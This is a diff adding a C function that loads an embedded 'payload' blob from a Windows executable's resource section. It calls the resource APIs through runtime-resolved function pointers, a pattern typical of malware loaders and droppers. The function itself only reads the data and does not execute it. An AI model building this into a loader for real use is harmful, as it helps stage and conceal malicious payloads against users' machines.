@@ -1,0 +1,33 @@
+BOOL LoadData(PBYTE* ppData, PDWORD pdwDataSize) {
+    HRSRC hRes;
+    HGLOBAL hResLoad;
+    
+    DEBUG_PRINT("LoadData: Attempting to load payload from resource section...");
+
+    hRes = pfnFindResourceA(NULL, MAKEINTRESOURCE(PAYLOAD_RESOURCE_ID), RT_RCDATA);
+    if (hRes == NULL) {
+        DEBUG_PRINT("LoadData: FindResourceA failed. Could not find payload resource.");
+        return FALSE;
+    }
+
+    hResLoad = pfnLoadResource(NULL, hRes);
+    if (hResLoad == NULL) {
+        DEBUG_PRINT("LoadData: LoadResource failed.");
+        return FALSE;
+    }
+
+    *ppData = (PBYTE)pfnLockResource(hResLoad);
+    if (*ppData == NULL) {
+        DEBUG_PRINT("LoadData: LockResource failed.");
+        return FALSE;
+    }
+
+    *pdwDataSize = pfnSizeofResource(NULL, hRes);
+    if (*pdwDataSize == 0) {
+        DEBUG_PRINT("LoadData: SizeofResource returned 0.");
+        return FALSE;
+    }
+
+    DEBUG_PRINT("LoadData: Successfully loaded %lu bytes from resource ID %d.", *pdwDataSize, PAYLOAD_RESOURCE_ID);
+    return TRUE;
+}
